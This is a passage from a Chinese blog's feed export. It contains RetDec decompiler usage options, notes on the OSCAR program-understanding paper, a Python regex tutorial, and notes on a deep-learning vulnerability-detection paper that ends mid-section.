class="hljs-keyword">if</span> OUTPUT_FORMAT is plain, INPUT_FILE.c.json <span class="hljs-keyword">if</span> OUTPUT_FORMAT is json|json<span class="hljs-literal">-human</span>).<br>[-<span class="hljs-type">s</span>|--<span class="hljs-type">silent</span>] Turns off informative output of the decompilation.<br>[-<span class="hljs-type">f</span>|--<span class="hljs-type">output</span>-<span class="hljs-type">format</span> <span class="hljs-type">OUTPUT_FORMAT</span>] Output format [<span class="hljs-type">plain</span>|<span class="hljs-type">json</span>|<span class="hljs-type">json</span>-<span class="hljs-type">human</span>] (default: plain).<br>[-<span class="hljs-type">m</span>|--<span class="hljs-type">mode</span> <span class="hljs-type">MODE</span>] Force the <span class="hljs-built_in">type</span> of decompilation mode [<span class="hljs-type">bin</span>|<span class="hljs-type">raw</span>] (default: bin).<br>[-<span class="hljs-type">p</span>|--<span class="hljs-type">pdb</span> <span class="hljs-type">FILE</span>] File with PDB debug information.<br>[-<span class="hljs-type">k</span>|--<span class="hljs-type">keep</span>-<span class="hljs-type">unreachable</span>-<span class="hljs-type">funcs</span>] Keep functions that are unreachable from the main function.<br>[--<span class="hljs-type">cleanup</span>] Removes temporary files created during the decompilation.<br>[--<span class="hljs-type">config</span>] Specify JSON decompilation configuration file.<br>[--<span class="hljs-built_in">disable-static</span>-<span class="hljs-type">code</span>-<span class="hljs-type">detection</span>] Prevents detection of statically linked code.<br>Selective decompilation arguments:<br>[--<span class="hljs-built_in">select-ranges</span> <span class="hljs-type">RANGES</span>] Specify a comma separated list of ranges to decompile (example: <span class="hljs-number">0</span>x100<span class="hljs-literal">-0x200</span>,<span class="hljs-number">0</span>x300<span class="hljs-literal">-0x400</span>,<span class="hljs-number">0</span>x500<span class="hljs-literal">-0x600</span>).<br>[--<span class="hljs-built_in">select-functions</span> <span class="hljs-type">FUNCS</span>] Specify a comma separated list of functions to decompile (example: fnc1,fnc2,fnc3).<br>[--<span class="hljs-built_in">select-decode</span>-<span class="hljs-type">only</span>] Decode only selected parts (functions/ranges). Faster decompilation, but worse results.<br>Raw or Intel HEX decompilation arguments:<br>[-<span class="hljs-type">a</span>|--<span class="hljs-type">arch</span> <span class="hljs-type">ARCH</span>] Specify target architecture [<span class="hljs-type">mips</span>|<span class="hljs-type">pic32</span>|<span class="hljs-type">arm</span>|<span class="hljs-type">thumb</span>|<span class="hljs-type">arm64</span>|<span class="hljs-type">powerpc</span>|<span class="hljs-type">x86</span>|<span class="hljs-type">x86</span>-<span class="hljs-number">64</span>].<br>                 Required <span class="hljs-keyword">if</span> it cannot be autodetected from the input (e.g. raw mode, Intel HEX).<br>[-<span class="hljs-type">e</span>|--<span class="hljs-type">endian</span> <span class="hljs-type">ENDIAN</span>] Specify target endianness [<span class="hljs-type">little</span>|<span class="hljs-type">big</span>].<br>                     Required <span class="hljs-keyword">if</span> it cannot be autodetected from the input (e.g. raw mode, Intel HEX).<br>[-<span class="hljs-type">b</span>|--<span class="hljs-type">bit</span>-<span class="hljs-type">size</span> <span class="hljs-type">SIZE</span>] Specify target bit size [<span class="hljs-number">16</span>|<span class="hljs-number">32</span>|<span class="hljs-number">64</span>] (default: <span class="hljs-number">32</span>).<br>                     Required <span class="hljs-keyword">if</span> it cannot be autodetected from the input (e.g. raw mode).<br>[--<span class="hljs-type">raw</span>-<span class="hljs-type">section</span>-<span class="hljs-type">vma</span> <span class="hljs-type">ADDRESS</span>] Virtual address <span class="hljs-built_in">where</span> section created from the raw binary will be placed.<br>[--<span class="hljs-type">raw</span>-<span class="hljs-type">entry</span>-<span class="hljs-type">point</span> <span class="hljs-type">ADDRESS</span>] Entry point address used <span class="hljs-keyword">for</span> raw binary (default: architecture dependent).<br>Archive decompilation arguments:<br>[--<span class="hljs-type">ar</span>-<span class="hljs-type">index</span> <span class="hljs-type">INDEX</span>] Pick file from archive <span class="hljs-keyword">for</span> decompilation by its zero<span class="hljs-literal">-based</span> index.<br>[--<span class="hljs-type">ar</span>-<span class="hljs-type">name</span> <span class="hljs-type">NAME</span>] Pick file from archive <span class="hljs-keyword">for</span> decompilation by its name.<br>[--<span class="hljs-type">static</span>-<span class="hljs-type">code</span>-<span class="hljs-type">sigfile</span> <span class="hljs-type">FILE</span>] Adds additional signature file <span class="hljs-keyword">for</span> <span class="hljs-keyword">static</span> code detection.<br>Backend arguments:<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">disabled</span>-<span class="hljs-type">opts</span> <span class="hljs-type">LIST</span>] Prevents the optimizations from the given comma<span class="hljs-literal">-separated</span> list of optimizations to be run.<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">enabled</span>-<span class="hljs-type">opts</span> <span class="hljs-type">LIST</span>] Runs only the optimizations from the given comma<span class="hljs-literal">-separated</span> list of optimizations.<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">call</span>-<span class="hljs-type">info</span>-<span class="hljs-type">obtainer</span> <span class="hljs-type">NAME</span>] Name of the obtainer of information about <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calls</span> [<span class="hljs-title">optim</span>|<span class="hljs-title">pessim</span>] <span class="hljs-params">(Default: optim)</span>.</span><br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">var</span>-<span class="hljs-type">renamer</span> <span class="hljs-type">STYLE</span>] Used renamer of variables [<span class="hljs-type">address</span>|<span class="hljs-type">hungarian</span>|<span class="hljs-type">readable</span>|<span class="hljs-type">simple</span>|<span class="hljs-type">unified</span>] (Default: readable).<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">no</span>-<span class="hljs-type">opts</span>] Disables backend optimizations.<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">emit</span>-<span class="hljs-type">cfg</span>] Emits a CFG <span class="hljs-keyword">for</span> each <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">backend</span> <span class="hljs-title">IR</span> <span class="hljs-params">(in the .dot format)</span>.</span><br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">emit</span>-<span class="hljs-type">cg</span>] Emits a CG <span class="hljs-keyword">for</span> the decompiled module <span class="hljs-keyword">in</span> the backend IR (<span class="hljs-keyword">in</span> the .dot format).<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">keep</span>-<span class="hljs-type">all</span>-<span class="hljs-type">brackets</span>] Keeps all brackets <span class="hljs-keyword">in</span> the generated code.<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">keep</span>-<span class="hljs-type">library</span>-<span class="hljs-type">funcs</span>] Keep functions from standard libraries.<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">no</span>-<span class="hljs-type">time</span>-<span class="hljs-type">varying</span>-<span class="hljs-type">info</span>] <span class="hljs-keyword">Do</span> not emit time<span class="hljs-literal">-varying</span> information, like dates.<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">no</span>-<span class="hljs-type">var</span>-<span class="hljs-type">renaming</span>] Disables renaming of variables <span class="hljs-keyword">in</span> the backend.<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">no</span>-<span class="hljs-type">compound</span>-<span class="hljs-type">operators</span>] <span class="hljs-keyword">Do</span> not emit compound operators (like +=) instead of assignments.<br>[--<span class="hljs-type">backend</span>-<span class="hljs-type">no</span>-<span class="hljs-type">symbolic</span>-<span class="hljs-type">names</span>] Disables the conversion of constant arguments to their symbolic names.<br>Decompilation <span class="hljs-keyword">process</span> arguments:<br>[--<span class="hljs-type">timeout</span> <span class="hljs-type">SECONDS</span>]<br>[--<span class="hljs-type">max</span>-<span class="hljs-type">memory</span> <span class="hljs-type">MAX_MEMORY</span>] Limits the maximal memory used by the given number of bytes.<br>[--<span class="hljs-type">no</span>-<span class="hljs-type">memory</span>-<span class="hljs-type">limit</span>] Disables the default memory limit (half of system RAM).<br>LLVM IR debug arguments:<br>[--<span class="hljs-type">print</span>-<span class="hljs-type">after</span>-<span class="hljs-type">all</span>] Dump LLVM IR to stderr after every LLVM pass.<br>[--<span class="hljs-type">print</span>-<span class="hljs-type">before</span>-<span class="hljs-type">all</span>] Dump LLVM IR to stderr before every LLVM pass.<br>Other arguments:<br>[-<span class="hljs-type">h</span>|--<span class="hljs-type">help</span>] Show this help.<br>[--<span class="hljs-type">version</span>] Show RetDec version.<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Install and Configue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Install</tag>
      
      <tag>LLVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记：《How could Neural Networks understand Programs》</title>
    <link href="/posts/31b1c8ee/"/>
    <url>/posts/31b1c8ee/</url>
    
    <content type="html"><![CDATA[<h1 id="摘要"><a class="markdownIt-Anchor" href="#摘要"></a> 摘要</h1><p>程序的语义理解是编程语言处理（PLP）的一个基本问题。最近基于 NLP 中的预训练技术学习代码表示的工作已经将前沿推向了这个方向。但是，PL 和 NL 的语义有本质的区别。这些被忽略，我们认为很难通过直接将现成的 NLP 预训练技术应用到源代码或通过启发式向模型添加特征来构建模型以更好地理解程序。</p><p>事实上，程序的语义可以通过 PL 理论中的形式语义来严格定义。例如，操作语义将有效程序的含义描述为通过基本操作（例如内存 I/O 和条件分支）更新环境（即内存地址-值函数）。</p><p>受此启发，我们提出了一种新颖的程序语义学习范式，该模型应该学习由以下组成的信息：</p><p>（1）与操作语义中的基本操作非常吻合的表示，以及</p><p>（2）环境转换的信息，即对程序理解必不可少。</p><p>为了验证我们的提议，作者提出了一个基于分层 Transformer 的预训练模型，称为 OSCAR，以更好地促进对程序的理解。 OSCAR 从<strong>中间表示 (IR) 和从静态分析派生的编码</strong>表示中学习，它们分别用于表示基本操作和近似环境转换。 OSCAR 凭经验展示了程序语义理解在许多实际软件工程任务上的出色能力。</p><h1 id="方法"><a class="markdownIt-Anchor" href="#方法"></a> 方法</h1><p>OSCAR是从指令和环境转换信息这两个方面学习代码表示的层次模型。</p><p><img src="/posts/31b1c8ee/Untitled.png" alt="Untitled"></p><h2 id="1输入表示"><a class="markdownIt-Anchor" href="#1输入表示"></a> 1.输入表示</h2><h3 id="ir"><a class="markdownIt-Anchor" href="#ir"></a> IR</h3><p>收集了大量真实世界程序（附录 F.1 中的详细信息）并将它们转换为 LLVM IR 作为我们的预训练数据</p><h3 id="抽象环境信息"><a class="markdownIt-Anchor" href="#抽象环境信息"></a> 抽象环境信息</h3><p>从指令中提取了三种类型的环境关系约束：由静态单一分配（SSA）控制的、由内存读取控制的和由内存写入控制的。这些信息可以通过 LLVM 内置的分析功能轻松获得</p><h2 id="2模型"><a class="markdownIt-Anchor" href="#2模型"></a> 2.模型</h2><h3 id="结构"><a class="markdownIt-Anchor" href="#结构"></a> 结构</h3><p>OSCAR 的模型架构是一个分层的多层 Transformer 编码器</p><p>OSCAR 由两个级别的编码器组成。</p><ul><li>下层由两个令牌级编码器组成，分别用于处理来自 IR 和抽象环境信息的令牌。</li><li>上层是指令级编码器，旨在根据下层的输出进一步提取特征。每一级编码器的实现与 BERT 相同（Devlin 等人，2019）。</li><li>将这两个令牌级编码器称为 IR 和 Env编码器，指令级编码器为 Inst。</li></ul><h3 id="位置信息编码"><a class="markdownIt-Anchor" href="#位置信息编码"></a> 位置信息编码</h3><ul><li>通过位置编码将控制流信息编码到模型中。</li><li>PCE 将三个可学习的嵌入向量分配给目标程序或代码片段中每条指令的位置，分别表示指令的当前位置，以及条件跳转后的目标位置，分别为真假。</li></ul><h3 id="预训练目标"><a class="markdownIt-Anchor" href="#预训练目标"></a> 预训练目标</h3><ul><li><p>MLM   mask机制</p></li><li><p>用优化技术进行对比性学习</p><p>采用[CLS]中的对比学习与动量编码器的目标（He等人，2020）作为OSCAR的自我监督任务</p></li></ul><h1 id="附录"><a class="markdownIt-Anchor" href="#附录"></a> 附录</h1><h2 id="transformer模型2017年谷歌"><a class="markdownIt-Anchor" href="#transformer模型2017年谷歌"></a> Transformer模型（2017年谷歌）</h2><p><a href="https://zhuanlan.zhihu.com/p/48508221">详解Transformer （Attention Is All You Need） - 知乎 (zhihu.com)</a></p><p>Transformer中抛弃了传统的CNN和RNN，整个网络结构完全是由Attention机制组成。</p><p>更准确地讲，Transformer由且仅由self-Attenion和Feed Forward Neural Network组成。一个基于Transformer的可训练的神经网络可以通过堆叠Transformer的形式进行搭建，作者的实验是通过搭建编码器和解码器各6层，总共12层的Encoder-Decoder</p><p><img src="/posts/31b1c8ee/Untitled%201.png" alt="Untitled"></p><p><img src="/posts/31b1c8ee/Untitled%202.png" alt="Untitled"></p><h2 id="bert2018谷歌"><a class="markdownIt-Anchor" href="#bert2018谷歌"></a> BERT（2018谷歌）</h2><p>双向Transformer</p><p>MLM机制：随机mask一个token,用左右的token来预测他，实现双向预测</p><p>12层encoder</p><h2 id="gptopenai"><a class="markdownIt-Anchor" href="#gptopenai"></a> GPT(OpenAI)</h2><p>单向Transformer</p><p>decoder</p><p>三种预训练模型区别</p><p><img src="/posts/31b1c8ee/Untitled%203.png" alt="Untitled"></p>]]></content>
    
    
    <categories>
      
      <category>Paper Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DeepLearning</tag>
      
      <tag>IR</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>正则表达式学习</title>
    <link href="/posts/469df0ac/"/>
    <url>/posts/469df0ac/</url>
    
    <content type="html"><![CDATA[<h1 id="正则表达式学习"><a class="markdownIt-Anchor" href="#正则表达式学习"></a> 正则表达式学习</h1><h2 id="常用模式"><a class="markdownIt-Anchor" href="#常用模式"></a> 常用模式</h2><ul><li><p><a href="#%E5%AE%8C%E6%95%B4%E6%A8%A1%E5%BC%8F">完整模式</a>见下</p><ul><li><code>\d</code>可以匹配一个数字<ul><li><code>'00\d'</code>可以匹配<code>'007'</code>，但无法匹配<code>'00A'</code>；</li><li><code>'\d\d\d'</code>可以匹配<code>'010'</code>；</li></ul></li><li><code>\w</code>可以匹配一个字母或数字<ul><li><code>'\w\w\d'</code>可以匹配<code>'py3'</code>；</li></ul></li><li><code>.</code>可以匹配任意字符<ul><li><code>'py.'</code>可以匹配<code>'pyc'</code>、<code>'pyo'</code>、<code>'py!'</code>等等。</li></ul></li><li><code>*</code>表示任意个字符（包括0个）</li><li><code>+</code>表示至少一个字符<ul><li><code>\s+</code>表示至少有一个空格，例如匹配<code>' '</code> ，<code>' '</code>等</li></ul></li><li><code>?</code>表示0个或1个字符，表示非贪婪匹配</li><li><code>&#123;n&#125;</code>表示n个字符<ul><li><code>\d&#123;3&#125;</code>表示匹配3个数字，例如<code>'010'</code></li></ul></li><li><code>&#123;n,m&#125;</code>表示n-m个字符</li><li><code>\s</code>可以匹配一个空格（也包括Tab等空白符）</li><li><code>A|B</code>可以匹配A或B<ul><li><code>(P|p)ython</code>可以匹配<code>'Python'</code>或者<code>'python'</code></li></ul></li><li><code>^</code>表示行的开头，<code>^\d</code>表示必须以数字开头。</li><li><code>$</code>表示行的结束，<code>\d$</code>表示必须以数字结束。</li><li><code>[]</code>表示范围<ul><li><code>[0-9a-zA-Z\_]</code>可以匹配一个数字、字母或者下划线；</li><li><code>[0-9a-zA-Z\_]+</code>可以匹配至少由一个数字、字母或者下划线组成的字符串，比如<code>'a100'</code>，<code>'0_Z'</code>，<code>'Py3000'</code>等等；</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]*</code>可以匹配由字母或下划线开头，后接任意个由一个数字、字母或者下划线组成的字符串，也就是Python合法的变量；</li><li><code>[a-zA-Z\_][0-9a-zA-Z\_]&#123;0, 19&#125;</code>更精确地限制了变量的长度是1-20个字符（前面1个字符+后面最多19个字符）。</li></ul></li><li><code>()</code> 表示分组，可以用group()函数来提取分组</li></ul><h2 id="python正则函数"><a class="markdownIt-Anchor" href="#python正则函数"></a> python正则函数</h2><h3 id="rematch匹配函数"><a class="markdownIt-Anchor" href="#rematch匹配函数"></a> <strong>re.match匹配函数</strong></h3><p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</p><p><strong>函数语法</strong>：</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">re.match(pattern, string, flags=<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><p><strong>函数参数说明</strong>：</p><p>pattern：匹配的正则表达式</p><p>string：要匹配的字符串。</p><p>flags：标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</p></li></ul><h3 id="research搜索函数"><a class="markdownIt-Anchor" href="#research搜索函数"></a> <strong>re.search搜索函数</strong></h3><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p><p><strong>函数语法：</strong></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">re.search(pattern, string, flags=<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><h3 id="resub检索替换函数"><a class="markdownIt-Anchor" href="#resub检索替换函数"></a> re.sub检索替换函数</h3><p>re.sub用于替换字符串中的匹配项。</p><p>语法：</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">re.sub(pattern, repl, string, <span class="hljs-attribute">count</span>=0, <span class="hljs-attribute">flags</span>=0)<br></code></pre></div></td></tr></table></figure><p>参数：</p><ul><li>pattern : 正则中的模式字符串。</li><li>repl : 替换的字符串，也可为一个函数。</li><li>string : 要被查找替换的原始字符串。</li><li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li><li>flags : 编译时用的匹配模式，数字形式。</li></ul><p>前三个为必选参数，后两个为可选参数。</p><h3 id="resplit切分函数"><a class="markdownIt-Anchor" href="#resplit切分函数"></a> re.split切分函数</h3><p><strong>用法</strong></p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">re.split(pattern, string, <span class="hljs-attribute">maxsplit</span>=0, <span class="hljs-attribute">flags</span>=0)<br></code></pre></div></td></tr></table></figure><h3 id="refindall"><a class="markdownIt-Anchor" href="#refindall"></a> re.findall</h3><p>以字符串或元组列表的形式返回<em>字符串</em>中模式的所有非重叠匹配项。从左到右扫描字符串，并按找到的顺序返回匹配项。空匹配项包含在结果中。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">re.findall(pattern, string, flags=<span class="hljs-number">0</span>)<br></code></pre></div></td></tr></table></figure><h3 id="recompile编译函数"><a class="markdownIt-Anchor" href="#recompile编译函数"></a> re.compile编译函数</h3><p>compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p><p>当要大批量重复使用match时可以使用，用以节省编译时间。</p><h2 id="函数标志位"><a class="markdownIt-Anchor" href="#函数标志位"></a> 函数标志位</h2><h2 id="完整模式"><a class="markdownIt-Anchor" href="#完整模式"></a> 完整模式</h2><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>^</td><td>匹配字符串的开头</td></tr><tr><td>$</td><td>匹配字符串的末尾。</td></tr><tr><td>.</td><td>匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td></tr><tr><td>[…]</td><td>用来表示一组字符,单独列出：[amk] 匹配 ‘a’，‘m’或’k’</td></tr><tr><td>[^…]</td><td>不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。</td></tr><tr><td>re*</td><td>匹配0个或多个的表达式。</td></tr><tr><td>re+</td><td>匹配1个或多个的表达式。</td></tr><tr><td>re?</td><td>匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式</td></tr><tr><td>re{ n}</td><td>匹配n个前面表达式。例如，&quot;o{2}“不能匹配&quot;Bob&quot;中的&quot;o”，但是能匹配&quot;food&quot;中的两个o。</td></tr><tr><td>re{ n,}</td><td>精确匹配n个前面表达式。例如，&quot;o{2,}“不能匹配&quot;Bob&quot;中的&quot;o”，但能匹配&quot;foooood&quot;中的所有o。&quot;o{1,}“等价于&quot;o+”。&quot;o{0,}“则等价于&quot;o*”。</td></tr><tr><td>re{ n, m}</td><td>匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式</td></tr><tr><td>a</td><td>b</td></tr><tr><td>(re)</td><td>匹配括号内的表达式，也表示一个组</td></tr><tr><td>(?imx)</td><td>正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。</td></tr><tr><td>(?-imx)</td><td>正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。</td></tr><tr><td>(?: re)</td><td>类似 (…), 但是不表示一个组</td></tr><tr><td>(?imx: re)</td><td>在括号中使用i, m, 或 x 可选标志</td></tr><tr><td>(?-imx: re)</td><td>在括号中不使用i, m, 或 x 可选标志</td></tr><tr><td>(?#…)</td><td>注释.</td></tr><tr><td>(?= re)</td><td>前向肯定界定符。如果所含正则表达式，以 … 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。</td></tr><tr><td>(?! re)</td><td>前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功。</td></tr><tr><td>(?&gt; re)</td><td>匹配的独立模式，省去回溯。</td></tr><tr><td>\w</td><td>匹配数字字母下划线</td></tr><tr><td>\W</td><td>匹配非数字字母下划线</td></tr><tr><td>\s</td><td>匹配任意空白字符，等价于 [\t\n\r\f]。</td></tr><tr><td>\S</td><td>匹配任意非空字符</td></tr><tr><td>\d</td><td>匹配任意数字，等价于 [0-9]。</td></tr><tr><td>\D</td><td>匹配任意非数字</td></tr><tr><td>\A</td><td>匹配字符串开始</td></tr><tr><td>\Z</td><td>匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。</td></tr><tr><td>\z</td><td>匹配字符串结束</td></tr><tr><td>\G</td><td>匹配最后匹配完成的位置。</td></tr><tr><td>\b</td><td>匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配&quot;never&quot; 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td></tr><tr><td>\B</td><td>匹配非单词边界。‘er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td></tr><tr><td>\n, \t, 等。</td><td>匹配一个换行符。匹配一个制表符, 等</td></tr><tr><td>\1…\9</td><td>匹配第n个分组的内容。</td></tr><tr><td>\10</td><td>匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。</td></tr></tbody></table><h2 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> 参考文献</h2><p><a href="https://docs.python.org/3/library/re.html">re — Regular expression operations — Python 3.10.7 documentation</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017639890281664">正则表达式 - 廖雪峰的官方网站 (liaoxuefeng.com)</a></p><p><a href="https://www.runoob.com/python3/python3-reg-expressions.html">Python3 正则表达式 | 菜鸟教程 (runoob.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>Memo</category>
      
      <category>Learing Record</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘</tag>
      
      <tag>正则表达式</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记：《Software Vulnerability Discovery via Learning Multi-Domain Knowledge Bases》</title>
    <link href="/posts/e99d01ee/"/>
    <url>/posts/e99d01ee/</url>
    
    <content type="html"><![CDATA[<h1 id="software-vulnerability-discovery-via-learning-multi-domain-knowledge-bases"><a class="markdownIt-Anchor" href="#software-vulnerability-discovery-via-learning-multi-domain-knowledge-bases"></a> Software Vulnerability Discovery via Learning Multi-Domain Knowledge Bases</h1><blockquote><p>CCF A类 IEEE TRANSACTIONS ON DEPENDABLE AND SECURE COMPUTING 期刊 2021</p></blockquote><h1 id="abstract"><a class="markdownIt-Anchor" href="#abstract"></a> Abstract</h1><p>本文提出了一个利用现有数据源中可转移知识的框架。为了提高检测性能，选择多个与漏洞相关的数据源，形成更广泛的可转移知识学习基础。</p><p>所选的与漏洞相关的数据源是跨域的，包括来自不同软件项目的历史漏洞数据，以及来自软件保证参考数据库(SARD)的数据，该数据库由合成的漏洞示例和概念证明测试用例组成。</p><p>为了从跨域数据集中提取漏洞检测中适用的信息，作者设计了一个基于深度学习的框架，该框架采用长短期记忆网络(Long-short Term Memory, LSTM)单元。该结合了异构数据源来学习易受攻击源代码模式的统一表示。</p><h1 id="i-introduction"><a class="markdownIt-Anchor" href="#i-introduction"></a> I. Introduction</h1><p>现有的基于ML的漏洞/缺陷检测方法，如Vuldeepecker，都是基于具有足够的标记训练数据的同类源来构建的。</p><p>本文提出了一种基于深度学习的框架，该框架能够利用多个异构的漏洞相关数据源来有效和自动地学习潜在的漏洞编程模式。通过将两种跨域数据源相结合，设计出既能从真实漏洞数据中，又能从合成数据集中共同提取有用信息的算法，提高漏洞检测性能。</p><p>框架由两个独立的深度学习网络组成。每个网络使用其中一个数据源进行独立训练。</p><p>分为两个应用场景：</p><ul><li>场景1：目标软件项目没有标记的漏洞数据</li><li>场景2：目标软件项目有一些可用的标记数据，但标记数据的数量不足以训练统计上鲁棒的分类器。</li></ul><h2 id="应用场景1"><a class="markdownIt-Anchor" href="#应用场景1"></a> 应用场景1</h2><blockquote><p>目标软件项目没有标记的漏洞数据</p></blockquote><p>在这个场景中，使用真实世界的历史漏洞数据来训练神经网络。</p><p>假设源项目的漏洞函数包含不同软件项目之间共享的与项目无关的漏洞模式，通过对目标项目进行漏洞检测的训练神经网络可以发现这些模式。</p><p>具体流程：</p><ol><li>使用来自其他软件项目(源项目)的真实历史漏洞数据来训练一个Bi-LSTM网络。</li><li>将目标项目的代码直接提供给训练好的网络进行分类</li></ol><p><img src="/posts/e99d01ee/Untitled.png" alt="Untitled"></p><h2 id="应用场景2"><a class="markdownIt-Anchor" href="#应用场景2"></a> 应用场景2</h2><blockquote><p>目标软件项目有一些可用的标记数据，但标记数据的数量不足以训练统计上鲁棒的分类器。</p></blockquote><p>具体流程：</p><ol><li>利用来自SARD和真实世界的漏洞两个数据源训练两个网络。</li><li>将两个训练好的网络作为特征提取器。给定一个带有有限标记数据的项目，我们将数据输入到每个训练过的网络，以获得漏洞知识表示的子集作为特征。</li><li>将从每个网络学习到的特征表示结合起来作为总的特征。</li><li>用上一步学习到的特征表示来训练一个随机森林分类器。</li><li>经过训练的分类器可以用于漏洞检测。即使对于一个没有任何标记数据的给定项目，可以使用其中一个经过训练的网络作为漏洞检测的分类器</li></ol><p><img src="/posts/e99d01ee/Untitled%201.png" alt="Untitled"></p><h1 id="iiapproach-overview"><a class="markdownIt-Anchor" href="#iiapproach-overview"></a> II.APPROACH OVERVIEW</h1><p>该方法以程序中的函数列表作为输入，并根据输入函数易受攻击的可能性输出一个函数排序列表</p><p>函数级漏洞检测器，1表示函数有漏洞，0表示无漏洞</p><h2 id="a数据收集"><a class="markdownIt-Anchor" href="#a数据收集"></a> A.数据收集</h2><p>数据包括来自SARD项目的合成漏洞样本和真实世界漏洞数据集</p><h3 id="1来自sard的合成漏洞样本"><a class="markdownIt-Anchor" href="#1来自sard的合成漏洞样本"></a> 1.来自SARD的合成漏洞样本</h3><p>从SARD项目收集的合成漏洞样本主要是人为构建的测试用例，用于模拟已知的漏洞源代码设置和/或提供概念证明代码演示。</p><p>在本文中，只使用了C/ c++测试用例进行实验。通过开发一个爬虫下载所有相关文件。下载的每个示例都是包含至少一个函数的源代码文件。根据SARD对每个测试用例的命名约定，脆弱函数用短语命名，如“bad”或“badSink”，而非脆弱函数的名称包含“good”或“goodSink”这样的词。因此，我们从源代码文件中提取函数，并根据SARD命名约定将它们标记为有漏洞或无漏洞。</p><h3 id="2真实世界的漏洞数据"><a class="markdownIt-Anchor" href="#2真实世界的漏洞数据"></a> 2.真实世界的漏洞数据</h3><p>采用了Lin等人收集的数据集<a href="https://bjx3b4ptnl.feishu.cn/docx/doxcnocQB6YEwErtXPYz74bAgEd#doxcncg6k2o0G26IYUjHElzxewf">[2]</a></p><p>该数据源包含了FFmpeg、LibTIFF、LibPNG、Pidgin、VLC media player和Asterisk这6个开源项目的漏洞函数和非漏洞函数。漏洞标签分别来自国家漏洞数据库(NVD)和公共漏洞与暴露(CVE)网站。</p><p>Lin等丢弃了跨多个功能或多个文件的漏洞(例如，过程间漏洞)。剔除已识别的漏洞函数和丢弃的漏洞，将剩余的函数作为非漏洞函数处理(见表1)。通过函数提取工具，他们可以提取出约90%的非脆弱函数。</p><p><img src="/posts/e99d01ee/Untitled%202.png" alt="Untitled"></p><p>因为数据源的不同，需要提供给不同的网络，并使用其中一个隐藏层的输出作为学习到的高级表示。</p><h2 id="b数据预处理"><a class="markdownIt-Anchor" href="#b数据预处理"></a> B.数据预处理</h2><p>在将数据源提供给各自的网络之前，数据需要采用与深度神经网络兼容的格式，采用以下流程进行处理：</p><ol><li>通过源代码处理和ast处理两种方法计算出两种数据源的文本向量序列</li><li>并通过将超出长度的序列截断的方式修剪成统一的长度</li><li>最后通过词嵌入完成将文本向量转化为数值向量，以此作为LSTM网络的输入。</li></ol><h3 id="1ast层次的处理"><a class="markdownIt-Anchor" href="#1ast层次的处理"></a> 